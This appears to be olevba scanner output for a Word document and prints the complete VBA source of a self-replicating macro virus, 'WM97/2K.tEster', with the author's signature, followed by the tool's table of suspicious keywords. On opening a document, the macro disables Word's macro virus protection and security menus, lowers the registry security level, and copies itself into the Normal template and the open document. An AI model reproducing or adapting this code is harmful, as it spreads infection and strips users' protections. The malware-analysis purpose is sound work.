olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tester
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tester - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'WM97/2K.tEster

Private Sub Document_open()
Dim id, vxCopy, ThisDoc, ActiveDoc, NormalDot
On Error Resume Next
Application.ScreenUpdating = False
Application.DisplayStatusBar = False
Application.ShowVisualBasicEditor = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
CommandBars("Macro").Controls("Security...").Enabled = False
CommandBars("Tools").Controls("Macro").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Security", "Level") = 1&      'Word 97
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&      'Word 2000
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&     'Word XP!
Set ThisDoc = ThisDocument.VBProject.VBComponents(1).CodeModule
Set NormalDot = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set ActiveDoc = ActiveDocument.VBProject.VBComponents(1).CodeModule
id = "'WM97/2K.tEster"
vxCopy = Strings.Trim(ThisDoc.lines(1, ThisDoc.countoflines))
If id <> NormalDot.lines(1, 1) Then
    NormalDot.deletelines 1, NormalDot.countoflines
    NormalDot.insertlines 1, vxCopy
End If
If id <> ActiveDoc.lines(1, 1) Then
    ActiveDoc.deletelines 1, ActiveDoc.countoflines
    ActiveDoc.insertlines 1, vxCopy
    ActiveDocument.SaveAs ActiveDocument.FullName
End If
'WM97/2K.tEster by gl_st0rm of [mions]
'My first "true" macro virii ever...! ;-)
'Greetz to e[ax] for his WM97/2K.String
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

